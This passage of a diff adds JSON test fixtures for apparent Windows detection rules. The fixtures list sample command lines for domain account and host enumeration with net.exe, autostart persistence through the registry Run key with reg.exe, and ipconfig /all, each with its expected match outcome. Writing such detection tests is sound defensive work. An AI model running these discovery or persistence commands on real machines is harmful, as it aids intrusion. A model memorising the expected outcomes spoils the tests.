+            "Image": "C:\\Windows\\System32\\net1.exe",
+            "CommandLine": "net1.exe view /domain:CORP"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "uppercase_candidate",
+          "event": {
+            "Image": "C:\\WINDOWS\\SYSTEM32\\NET.EXE",
+            "CommandLine": "NET.EXE VIEW /DOMAIN:LAB"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "tab_boundaries_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe\tview\t/domain:LAB"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "additional_view_option_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe view /domain:LAB /all"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "empty_domain_end_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe view /domain:"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "empty_domain_space_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe view /domain: /all"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "empty_domain_tab_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe view /domain:\t/all"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "no_domain_value_form_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe view /domain"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "view_token_suffix_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe overview /domain:LAB"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "domain_token_prefix_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe view x/domain:LAB"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "different_net_operation_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe use /domain:LAB"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "specific_server_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe view \\\\fileserver"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "wrong_executable_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "net.exe view /domain:LAB"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "benign_quoted_empty_value_is_raw_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe view /domain:\"\""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "missing_image_invalid_profile",
+          "event": {
+            "CommandLine": "net.exe view /domain:LAB"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        },
+        {
+          "name": "missing_command_invalid_profile",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        }
+      ]
+    },
+    {
+      "rule_id": "a4a7afd2-690b-4412-aa10-5991dd73bb2d",
+      "source": {
+        "product": "windows",
+        "category": "process_creation"
+      },
+      "cases": [
+        {
+          "name": "domain_account_listing_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user /domain"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "legitimate_helpdesk_listing_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net1.exe",
+            "CommandLine": "net1.exe user /domain"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "uppercase_candidate",
+          "event": {
+            "Image": "C:\\WINDOWS\\SYSTEM32\\NET.EXE",
+            "CommandLine": "NET.EXE USER /DOMAIN"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "tab_boundaries_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe\tuser\t/domain\t"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "one_trailing_space_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user /domain "
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "local_account_listing_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "domain_flag_suffix_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user /domains"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "user_token_suffix_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe superuser /domain"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "named_account_query_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user alice /domain"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "password_change_not_enumeration",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user alice example-password /domain"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "attribute_change_not_enumeration",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user alice /active:no /domain"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "domain_account_creation_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user alice example-password /add /domain"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "malformed_mutation_prefix_not_listing",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe /delete user /domain"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "quoted_domain_flag_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user \"/domain\""
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "multiple_trailing_spaces_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user /domain  "
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "wrong_executable_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "net.exe user /domain"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "missing_image_invalid_profile",
+          "event": {
+            "CommandLine": "net.exe user /domain"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        },
+        {
+          "name": "missing_command_invalid_profile",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        }
+      ]
+    },
+    {
+      "rule_id": "6d621830-6b1b-4eaa-ab18-a566c208174a",
+      "source": {
+        "product": "windows",
+        "category": "process_creation"
+      },
+      "cases": [
+        {
+          "name": "hkcu_run_add_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabApp /d C:\\Tools\\app.exe /f"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "legitimate_application_autostart_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ApprovedApp /d C:\\ProgramData\\Approved\\app.exe /f"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "hklm_quoted_key_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v LabApp /d \"C:\\Program Files\\App\\app.exe\" /f"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "uppercase_candidate",
+          "event": {
+            "Image": "C:\\WINDOWS\\SYSTEM32\\REG.EXE",
+            "CommandLine": "REG.EXE ADD HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN /V LABAPP /D C:\\TOOLS\\APP.EXE"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "tab_boundaries_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe\tadd\tHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\t/v\tLabApp\t/d\tC:\\Tools\\app.exe"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "runonce_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v LabApp /d C:\\Tools\\app.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "runbackup_key_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunBackup /v LabApp /d C:\\Tools\\app.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "registry_query_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabApp"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "wrong_hive_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCR\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabApp /d C:\\Tools\\app.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "expanded_hive_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabApp /d C:\\Tools\\app.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "default_value_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /ve /d C:\\Tools\\app.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "value_flag_prefix_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /verbose LabApp /d C:\\Tools\\app.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "missing_data_argument_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabApp /d"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "wrong_executable_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabApp /d C:\\Tools\\app.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "benign_quoted_command_mention_remains_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe query HKCU\\Software\\Example /f \" add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabApp /d app \""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "missing_image_invalid_profile",
+          "event": {
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabApp /d app"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        },
+        {
+          "name": "missing_command_invalid_profile",
+          "event": {
+            "Image": "C:\\Windows\\System32\\reg.exe"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        }
+      ]
+    },
+    {
+      "rule_id": "06349766-1404-4bcc-a36a-c4da64e8815f",
+      "source": {
+        "product": "windows",
+        "category": "process_creation"
+      },
+      "cases": [
+        {
+          "name": "all_configuration_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "ipconfig.exe /all"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "legitimate_network_diagnostics_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "C:\\Windows\\System32\\ipconfig.exe /all"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "uppercase_candidate",
+          "event": {
+            "Image": "C:\\WINDOWS\\SYSTEM32\\IPCONFIG.EXE",
+            "CommandLine": "IPCONFIG.EXE /ALL"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "tab_boundaries_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "ipconfig.exe\t/all\t"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "quoted_image_path_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "\"C:\\Windows\\System32\\ipconfig.exe\" /all"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "trailing_option_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "ipconfig.exe /all /?"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "allcompartments_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "ipconfig.exe /allcompartments"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "flag_prefix_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "ipconfig.exe x/all"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "release_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "ipconfig.exe /release"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "renew_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "ipconfig.exe /renew"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "no_flag_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "ipconfig.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "quoted_flag_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "ipconfig.exe \"/all\""
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "wrong_executable_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "ipconfig.exe /all"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "benign_quoted_flag_mention_remains_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe",
+            "CommandLine": "ipconfig.exe /? \" /all \""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "missing_image_invalid_profile",
+          "event": {
+            "CommandLine": "ipconfig.exe /all"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        },
+        {
+          "name": "missing_command_invalid_profile",
+          "event": {
+            "Image": "C:\\Windows\\System32\\ipconfig.exe"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        }
+      ]
     }
   ]
 }
